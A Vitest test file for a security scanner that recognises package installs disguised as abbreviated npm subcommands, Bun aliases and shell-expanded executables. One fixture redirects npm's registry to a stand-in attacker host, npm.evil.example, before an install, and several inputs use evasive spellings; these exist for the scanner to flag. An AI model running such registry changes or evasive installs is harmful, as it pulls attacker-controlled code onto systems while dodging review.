// Decision D-162 in the scanner: an npm subcommand is read as npm resolves it (deref in lib/utils/cmd-list.js, the
// fact commandNames): camelCase as kebab-case, an exact command, an alias, or a unique abbreviation of the commands and
// aliases, whose alias is followed. A word npm finds no single command for runs nothing. Bun reads its aliases a and c
// as add and create; pnpm, Yarn and pip take their command names only as written.
import { describe, expect, it } from 'vitest';
import { scanCommandLine } from '../../src/check/command.ts';

const specs = (line: string) => scanCommandLine(line).requests.map((request) => `${request.tool}:${request.spec}`);

describe('npm subcommands as npm resolves them', () => {
  it.each([
    // exec: an abbreviation (exe), also with --package before it, among its arguments and with -c.
    ['npm exe cutekitten-test@1.0.1', ['npm:cutekitten-test@1.0.1']],
    ['npm exe kitten', ['npm:kitten']],
    ['npm --package=cutekitten-test@1.0.1 exe kitten', ['npm:cutekitten-test@1.0.1']],
    ['npm --package cutekitten-test@1.0.1 exe kitten', ['npm:cutekitten-test@1.0.1']],
    ['npm exe kitten --package=cutekitten-test@1.0.1', ['npm:cutekitten-test@1.0.1']],
    ['npm exe -c "npm i cutekitten-test@1.0.1"', ['npm:cutekitten-test@1.0.1']],
    ["npm --call 'npm i cutekitten-test@1.0.1' exe", ['npm:cutekitten-test@1.0.1']],
    // install: camelCase (installTest is install-test), an abbreviation of install-test, and of add (npm 12).
    ['npm installTest cutekitten-test@1.0.1', ['npm:cutekitten-test@1.0.1']],
    ['npm install-t cutekitten-test@1.0.1', ['npm:cutekitten-test@1.0.1']],
    ['npm ad cutekitten-test@1.0.1', ['npm:cutekitten-test@1.0.1']],
    ['npm --save-exact installTest cutekitten-test@1.0.1', ['npm:cutekitten-test@1.0.1']],
    // init: ini is init, cre and creat are the alias create, both run create-<name>.
    ['npm ini kitten', ['npm:create-kitten']],
    ['npm cre kitten', ['npm:create-kitten']],
    ['npm creat kitten@1.0.1', ['npm:create-kitten@1.0.1']],
    ['npm ini @scope', ['npm:@scope/create']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });

  it('reads the full spellings and aliases as before', () => {
    expect(specs('npm exec cutekitten-test@1.0.1')).toEqual(['npm:cutekitten-test@1.0.1']);
    expect(specs('npm x cutekitten-test@1.0.1')).toEqual(['npm:cutekitten-test@1.0.1']);
    expect(specs('npm insta cutekitten-test@1.0.1')).toEqual(['npm:cutekitten-test@1.0.1']);
    expect(specs('npm it cutekitten-test@1.0.1')).toEqual(['npm:cutekitten-test@1.0.1']);
    expect(specs('npm innit kitten')).toEqual(['npm:create-kitten']);
    expect(specs('npm create kitten')).toEqual(['npm:create-kitten']);
  });

  it.each([
    // npm prints its usage and runs nothing for a word that abbreviates more than one command or alias.
    ['npm ex cutekitten-test@1.0.1', 'exec, explain, explore'],
    ['npm e cutekitten-test@1.0.1', 'edit, exec, explain, explore'],
    ['npm install- cutekitten-test@1.0.1', 'install-ci-test, install-clean, install-scripts, install-test'],
    ['npm a cutekitten-test@1.0.1', 'access, add, approve-scripts, audit, author'],
    ['npm cleanIn cutekitten-test@1.0.1', 'clean-install, clean-install-test'],
  ])('%s is no install: npm finds more than one command for it (%s)', (line) => {
    expect(specs(line)).toEqual([]);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });

  it('takes a word npm finds no command for as no install', () => {
    for (const line of ['npm INSTALL cutekitten-test@1.0.1', 'npm Install cutekitten-test@1.0.1', 'npm in- cutekitten-test@1.0.1', 'npm installx cutekitten-test@1.0.1']) {
      expect(specs(line), line).toEqual([]);
    }
  });

  it('reads an abbreviation that only create starts with as npm init', () => {
    expect(specs('npm cr kitten')).toEqual(['npm:create-kitten']);
  });

  it('asks about an executable, script or file the shell expands before an abbreviated install or exec', () => {
    for (const line of ['"$NPM" exe kitten', '"$NPM" installTest kitten', '"$NPM" ini kitten', '$(echo npm) ad kitten', '"$BUN" a kitten', '"$C" req x/y', 'node "$S" exe kitten', '. "$X" installTest kitten']) {
      expect(scanCommandLine(line).unreadable, line).toContain('is expanded by the shell');
    }
    // A script run with run (npm's rum) installs nothing, as before.
    expect(scanCommandLine('node "$S" rum lint').unreadable).toBeUndefined();
  });

  it('reads the directory options of an abbreviated npm exec as those of npm exec', () => {
    const directories = (line: string) => scanCommandLine(line).requests.map((request) => request.directory);
    expect(directories('npm exe --prefix sub kitten')).toEqual(directories('npm exec --prefix sub kitten'));
    expect(directories('npm exe kitten --prefix sub')).toEqual(directories('npm exec kitten --prefix sub'));
    expect(directories('npm installTest --prefix sub kitten')).toEqual([{ steps: ['sub'], localPrefix: true }]);
  });

  it('counts options of npm exec after the package only before -- also for an abbreviation', () => {
    expect(specs('npm exe -- kitten --package=cutekitten-test@1.0.1')).toEqual(['npm:kitten']);
  });

  it('reads an abbreviated npm config command next to an install as a change of the configuration, as before', () => {
    expect(scanCommandLine('npm conf set registry=https://npm.evil.example && npm installTest kitten').unreadable).toContain("changes the package manager's configuration");
  });
});

describe('other package managers', () => {
  it('reads bun a as bun add and bun c as bun create', () => {
    expect(specs('bun a cutekitten-test@1.0.1')).toEqual(['bun:cutekitten-test@1.0.1']);
    expect(specs('bun a -d cutekitten-test@1.0.1')).toEqual(['bun:cutekitten-test@1.0.1']);
    expect(specs('bun c kitten')).toEqual(['bun:create-kitten']);
    expect(specs('bun c @scope/kitten')).toEqual(['bun:@scope/create-kitten']);
  });

  it('takes the command names of pnpm, Yarn, Bun and pip only as written', () => {
    // pnpm and Yarn run a script or a binary of the project for a word that is no command; bun runs a script or file.
    expect(specs('pnpm dl cutekitten-test@1.0.1')).toEqual([]);
    expect(specs('pnpm ad cutekitten-test@1.0.1')).toEqual([]);
    expect(specs('yarn dl cutekitten-test@1.0.1')).toEqual([]);
    expect(specs('yarn ad cutekitten-test@1.0.1')).toEqual([]);
    expect(specs('bun ad cutekitten-test@1.0.1')).toEqual([]);
    expect(specs('bun cr kitten')).toEqual([]);
    // pip stops with "unknown command" (and a guess) for a word that is no command.
    expect(specs('pip ins cutekitten')).toEqual([]);
    expect(specs('pip instal cutekitten')).toEqual([]);
  });

  it('does not read the aliases of bun for npm, pnpm or Yarn', () => {
    expect(specs('pnpm a cutekitten-test@1.0.1')).toEqual([]);
    expect(specs('yarn c kitten')).toEqual([]);
    expect(specs('npm c kitten')).toEqual([]);
  });
});
